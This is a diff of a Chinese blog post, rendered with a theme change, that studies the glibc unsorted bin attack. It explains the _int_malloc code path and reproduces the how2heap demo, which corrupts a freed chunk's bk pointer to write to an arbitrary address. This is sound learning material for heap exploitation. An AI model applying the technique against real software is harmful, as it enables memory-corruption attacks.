@@ -1,66 +1,227 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="" data-default-color-scheme=&#34;auto&#34;>
+
+
 
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  
-  
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content="my blogs">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
   
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <title>
-    Unsorted Bin Attack |
+  <title>Unsorted Bin Attack - 知世の小屋</title>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
     
-    知世の小屋</title>
+    
+      
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css">
+    
   
-  <link rel="shortcut icon" href="/favicon.ico">
+
   
-  <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-  
-  <script src="/js/pace.min.js"></script>
-</head></html>
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+</head>
+
 
 <body>
-  <main class="content">
-    <section class="outer">
-  <article id="post-Unsorted-Bin-Attack" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
 
-  <div class="article-inner">
-    
-    <header class="article-header">
-      
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-<h1 class="article-title" itemprop="name">
-  Unsorted Bin Attack
-</h1>
-
-
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2019/07/21/Unsorted-Bin-Attack/" class="article-date">
-  <time datetime="2019-07-21T12:30:12.000Z" itemprop="datePublished">2019-07-21</time>
-</a>
-      
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    
+  </div>
+</nav>
 
-    
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Unsorted Bin Attack">
+              
+            </span>
 
-    <div class="article-entry" itemprop="articleBody">
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-07-21 20:30" pubdate="">
+        July 21, 2019 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      898 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
       
       
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
       
-      <h1 id="Unsorted-Bin-Attack-study"><a href="#Unsorted-Bin-Attack-study" class="headerlink" title="Unsorted Bin Attack study"></a>Unsorted Bin Attack study</h1><blockquote>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Unsorted Bin Attack</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Unsorted-Bin-Attack-study"><a href="#Unsorted-Bin-Attack-study" class="headerlink" title="Unsorted Bin Attack study"></a>Unsorted Bin Attack study</h1><blockquote>
 <p>做一下unsorted bin 的攻击总结好了,日常简单堆的题目靠unsorted bin泄露libc地址Hhh</p>
 </blockquote>
-<h1 id="借鉴学习师傅们的文章"><a href="#借鉴学习师傅们的文章" class="headerlink" title="借鉴学习师傅们的文章"></a>借鉴学习师傅们的文章</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</span><br><span class="line">https://www.anquanke.com/post/id/85127</span><br><span class="line">https://veritas501.space/2017/07/25/%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B1%95%E7%A4%BA%E5%A0%86%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/</span><br><span class="line">https://blog.csdn.net/qq_29343201/article/details/74187621</span><br></pre></td></tr></table></figure>
+<h1 id="借鉴学习师傅们的文章"><a href="#借鉴学习师傅们的文章" class="headerlink" title="借鉴学习师傅们的文章"></a>借鉴学习师傅们的文章</h1><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs undefined">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/<br>https://www.anquanke.com/post/id/<span class="hljs-number">85127</span><br>https://veritas<span class="hljs-number">501</span>.space/<span class="hljs-number">2017</span>/<span class="hljs-number">07</span>/<span class="hljs-number">25</span>/<span class="hljs-symbol">%E5</span><span class="hljs-symbol">%9</span>B<span class="hljs-symbol">%BE</span><span class="hljs-symbol">%E5</span><span class="hljs-symbol">%BD</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%E5</span><span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%96</span><span class="hljs-symbol">%E5</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%E7</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%BA</span><span class="hljs-symbol">%E5</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%86</span><span class="hljs-symbol">%E5</span><span class="hljs-symbol">%88</span><span class="hljs-symbol">%A9</span><span class="hljs-symbol">%E7</span><span class="hljs-symbol">%94</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%E8</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%E7</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%8</span>B/<br>https://blog.csdn.net/qq_<span class="hljs-number">29343201</span>/article/details/<span class="hljs-number">74187621</span><br></code></pre></td></tr></table></figure>
 <p>在此日常膜大师傅们</p>
 <h1 id="unsorted-bin相关"><a href="#unsorted-bin相关" class="headerlink" title="unsorted bin相关"></a>unsorted bin相关</h1><h2 id="零碎知识"><a href="#零碎知识" class="headerlink" title="零碎知识:"></a>零碎知识:</h2><p>  我们知道Ptmalloc一共维护了128个bin，并使用一个数组来存储这些bin,而这些数组的第一个就是Unsorted bin</p>
 <ul>
@@ -84,141 +245,211 @@
 </ul>
 <p>也就是除了fastbin和tcache,其余的都是先进先出原则</p>
 <h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>_int_malloc中有这么一段代码:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">unsorted_chunks (<span class="hljs-name">av</span>)-&gt;bk = bck<span class="hljs-comment">;</span><br>bck-&gt;fd = unsorted_chunks (<span class="hljs-name">av</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 <p>也就是如果我们能控制此时bk的的值,我们就能把unsorted_chunks (av)写到任意地址</p>
-<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><p>这里我采用shellphish的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">代码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br><span class="line">		   &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	unsigned long stack_var=0;</span><br><span class="line">	fprintf(stderr, &quot;Let&apos;s first look at the target we want to rewrite on stack:\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	unsigned long *p=malloc(400);</span><br><span class="line">	fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,p);</span><br><span class="line">	fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br><span class="line">           &quot;the first one during the free()\n\n&quot;);</span><br><span class="line">	malloc(500);</span><br><span class="line"></span><br><span class="line">	free(p);</span><br><span class="line">	fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br><span class="line">		   &quot;point to %p\n&quot;,(void*)p[1]);</span><br><span class="line"></span><br><span class="line">	//------------VULNERABILITY-----------</span><br><span class="line"></span><br><span class="line">	p[1]=(unsigned long)(&amp;stack_var-2);</span><br><span class="line">	fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;,(void*)p[1]);</span><br><span class="line"></span><br><span class="line">	//------------------------------------</span><br><span class="line"></span><br><span class="line">	malloc(400);</span><br><span class="line">	fprintf(stderr, &quot;Let&apos;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br><span class="line">		   &quot;rewritten:\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><p>这里我采用shellphish的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">代码</a><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "</span><br>		   <span class="hljs-string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);<br><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var=<span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Let's first look at the target we want to rewrite on stack:\n"</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %ld\n\n"</span>, &amp;stack_var, stack_var);<br><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,p);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"And allocate another normal chunk in order to avoid consolidating the top chunk with"</span><br>           <span class="hljs-string">"the first one during the free()\n\n"</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>	<span class="hljs-built_in">free</span>(p);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "</span><br>		   <span class="hljs-string">"point to %p\n"</span>,(<span class="hljs-keyword">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>	p[<span class="hljs-number">1</span>]=(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n"</span>,(<span class="hljs-keyword">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-comment">//------------------------------------</span><br><br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Let's malloc again to get the chunk we just free. During this time, the target should have already been "</span><br>		   <span class="hljs-string">"rewritten:\n"</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-keyword">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></table></figure></p>
 <p>咕咕咕~</p>
 
-      
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/07/24/off-by-one/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">off-by-one</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/07/19/unlink-study/">
+                        <span class="hidden-mobile">unlink_study</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://nightRainy.github.io/2019/07/21/Unsorted-Bin-Attack/" data-id="ckmk3304b00017gjd88vj16i6" class="article-share-link">
-        Share
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
       </a>
-      
-    </footer>
+    
 
-  </div>
-
-  
-  
-<nav class="article-nav">
-  
-  <a href="/2019/07/24/off-by-one/" class="article-nav-link">
-    <strong class="article-nav-caption">Newer</strong>
-    <div class="article-nav-title">
-      
-      off-by-one
-      
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-  </a>
-  
-  
-  <a href="/2019/07/19/unlink-study/" class="article-nav-link">
-    <strong class="article-nav-caption">Older</strong>
-    <div class="article-nav-title">unlink_study</div>
-  </a>
-  
-</nav>
-
-  
-
-  
-  
-  
-  
-
-</article>
-</section>
-    <footer class="footer">
-  <div class="outer">
-    <div class="float-right">
-      <ul class="list-inline">
-  
-  <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
-  
-  <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
-  
-</ul>
-    </div>
-    <ul class="list-inline">
-      <li>知世の小屋 &copy; 2021</li>
-      
-      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
-      <li>theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
-    </ul>
   </div>
-</footer>
+</div>
+    
+
+    
   </main>
-  <aside class="sidebar">
-    <button class="navbar-toggle"></button>
-<nav class="navbar">
-  
-  <div class="logo">
-    <a href="/"><img src="/images/hexo.svg" alt="知世の小屋"></a>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
   
-  <ul class="nav nav-main">
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/">主页</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/archives">归档</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/gallery">相册</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/about">关于</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link nav-item-search" title="Search">
-        <i class="fe fe-search"></i>
-        Search
-      </a>
-    </li>
-  </ul>
-</nav>
-<nav class="navbar navbar-bottom">
-  <ul class="nav">
-    <li class="nav-item">
-      <div class="totop" id="totop">
-  <i class="fe fe-rocket"></i>
-</div>
-    </li>
-    <li class="nav-item">
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css">
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/events.js"></script>
+<script src="/js/plugins.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/img-lazyload.js"></script>
+  
+
+
+
+  
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js"></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
       
-      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
-        <i class="fe fe-feed"></i>
-      </a>
+      typing(title)
       
-    </li>
-  </ul>
-</nav>
-<div class="search-form-wrap">
-  <div class="local-search local-search-plugin">
-  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
-  <div id="local-search-result" class="local-search-result"></div>
-</div>
-</div>
-  </aside>
-  <script src="/js/jquery-2.0.3.min.js"></script>
-<script src="/js/jquery.justifiedGallery.min.js"></script>
-<script src="/js/lazyload.min.js"></script>
-<script src="/js/busuanzi-2.3.pure.min.js"></script>
-
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    })(window, document);
+  </script>
 
 
 
+  <script src="/js/local-search.js"></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
 
 
-<script src="/js/ocean.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script src="/js/boot.js"></script>
+
+
 </body>
-
 </html>
